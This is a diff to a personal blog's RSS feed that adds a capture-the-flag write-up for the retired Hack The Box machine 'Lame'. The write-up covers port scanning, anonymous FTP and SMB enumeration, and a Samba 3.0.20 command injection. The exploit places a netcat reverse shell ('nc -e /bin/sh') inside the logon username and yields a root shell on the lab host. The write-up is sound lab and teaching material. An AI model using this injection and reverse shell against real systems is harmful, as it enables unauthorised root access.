@@ -4,8 +4,135 @@
         <link>/posts/</link>
         <description>Recent content in Posts on Hello World. I am Dito Prabowo</description>
         <generator>Hugo -- gohugo.io</generator>
-        <lastBuildDate>Mon, 25 Oct 2021 20:27:53 +0700</lastBuildDate>
+        <lastBuildDate>Tue, 26 Oct 2021 18:20:32 +0700</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Recap HTB: Lame</title>
+            <link>/posts/recap-htb-lame/</link>
+            <pubDate>Tue, 26 Oct 2021 18:20:32 +0700</pubDate>
+            
+            <guid>/posts/recap-htb-lame/</guid>
+            <description>0x0 Intro    Name Values     Machine Name Lame   Difficulty Easy   Retired True   Release Date 1686 Days   Machine IP 10.10.10.3    0x1 Enumeration Nmap/Rustscan Lets start to enumerate the machine first, using this command :
+$ rustscan -a 10.10.10.3 --ulimit 10000 -- -sV -sC -A -T5 -Pn PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 2.</description>
+            <content type="html"><![CDATA[<h2 id="0x0-intro">0x0 Intro</h2>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align:right">Values</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Machine Name</td>
+<td style="text-align:right">Lame</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td style="text-align:right">Easy</td>
+</tr>
+<tr>
+<td>Retired</td>
+<td style="text-align:right">True</td>
+</tr>
+<tr>
+<td>Release Date</td>
+<td style="text-align:right">1686 Days</td>
+</tr>
+<tr>
+<td>Machine IP</td>
+<td style="text-align:right">10.10.10.3</td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x1-enumeration">0x1 Enumeration</h2>
+<h3 id="nmaprustscan">Nmap/Rustscan</h3>
+<p>Lets start to enumerate the machine first, using this command :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rustscan -a 10.10.10.3 --ulimit <span style="color:#ae81ff">10000</span> -- -sV -sC -A -T5 -Pn
+
+PORT    STATE SERVICE     REASON  VERSION
+21/tcp  open  ftp         syn-ack vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.14.18
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">1024</span> 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+| ...
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>So open port on this machine are ftp, ssh, and smb. Try to enumerate more.</p>
+<p>Try to access FTP it success login using anonymous, but nothing there and cant list other directory</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ftp 10.10.10.3
+
+Connected to 10.10.10.3.
+<span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 2.3.4<span style="color:#f92672">)</span>
+Name <span style="color:#f92672">(</span>10.10.10.3:dito<span style="color:#f92672">)</span>: anonymous
+<span style="color:#ae81ff">331</span> Please specify the password.
+Password:
+<span style="color:#ae81ff">230</span> Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
+<span style="color:#ae81ff">150</span> Here comes the directory listing.
+drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">65534</span>        <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2010</span> .
+drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">65534</span>        <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2010</span> ..
+<span style="color:#ae81ff">226</span> Directory send OK.
+
+</code></pre></div><p>Enumerate on Samba :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -L <span style="color:#ae81ff">\\\\</span>10.10.10.3
+protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
+
+$ smbclient -L <span style="color:#ae81ff">\\\\</span>10.10.10.3 --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;client min protocol=NT1&#39;</span>
+Enter WORKGROUP<span style="color:#ae81ff">\d</span>ito<span style="color:#e6db74">&#39;&#39;</span>s password:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk
+        IPC$            IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>
+        ADMIN$          IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>
+
+$ smbclient <span style="color:#ae81ff">\\\\</span>10.10.10.3<span style="color:#ae81ff">\\</span>tmp --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;client min protocol=NT1&#39;</span>
+Enter WORKGROUP<span style="color:#ae81ff">\d</span>ito<span style="color:#e6db74">&#39;&#39;</span>s password:
+Anonymous login successful
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> 
+</code></pre></div><p>But we got information it using samba <code>3.0.20-Debian</code>. In that version there is vulnerabiliry command injection. Try it :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient <span style="color:#ae81ff">\\\\</span>10.10.10.3<span style="color:#ae81ff">\\</span>tmp --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;client min protocol=NT1&#39;</span>
+Enter WORKGROUP<span style="color:#ae81ff">\d</span>ito<span style="color:#e6db74">&#39;&#39;</span>s password:
+Anonymous login successful
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> logon <span style="color:#e6db74">&#34;/=`nohup nc -e /bin/sh 10.10.14.18 9000`&#34;</span>
+Password:
+session setup failed: NT_STATUS_IO_TIMEOUT
+smb: <span style="color:#ae81ff">\&gt;</span>
+
+$ nc -lnvp <span style="color:#ae81ff">9000</span>
+Listening on 0.0.0.0 <span style="color:#ae81ff">9000</span>
+Connection received on 10.10.10.3 <span style="color:#ae81ff">51520</span>
+id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+whoami
+root
+</code></pre></div><p>Instanly get root :D</p>
+]]></content>
+        </item>
         
         <item>
             <title>Recap HTB: Sense</title>
